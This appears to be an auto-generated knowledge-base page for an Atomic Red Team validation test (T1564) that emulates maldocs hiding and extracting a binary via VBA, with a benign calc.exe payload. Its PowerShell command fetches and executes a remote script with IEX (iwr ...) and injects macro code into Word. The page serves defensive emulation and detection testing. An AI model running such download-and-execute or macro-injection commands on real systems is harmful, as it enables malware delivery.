---
atomic_guid: "6afe288a-8a8b-4d33-a629-8d03ba9dad3a"
title: "Extract binary files via VBA"
framework: "atomic"
generated: "true"
attack_technique_id: "T1564"
attack_technique_name: "Hide Artifacts"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564/T1564.yaml"
build_date: "2026-04-27 19:12:28"
executor: "powershell"
aliases:
  - "6afe288a-8a8b-4d33-a629-8d03ba9dad3a"
  - "Extract binary files via VBA"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This module extracts a binary (calc.exe) from inside of another binary. 

In the wild maldoc authors will use this technique to hide binaries inside of files stored 
within the office document itself. An example of this technique can be seen in sample

f986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226

This sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2
is the same document without all the malicious code. Document 1 will copy Document 2 to the file system
and then "peek" inside of this document and pull out the oleObject.bin file. Contained inside of this
oleObject.bin file is a payload that is parsed out and executed on the file system.

## ATT&CK Mapping

- [[kb/attack/techniques/T1564-hide_artifacts|T1564: Hide Artifacts]]

## Dependencies

Microsoft Word must be installed

### Prerequisite Check

```powershell
try {
  New-Object -COMObject "Word.Application" | Out-Null
  Stop-Process -Name "winword"
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
```

## Executor

- name: powershell

### Command

```powershell
$macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt")
$macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
```

### Cleanup

```powershell
Remove-Item "$env:TEMP\extracted.exe" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564/T1564.yaml)
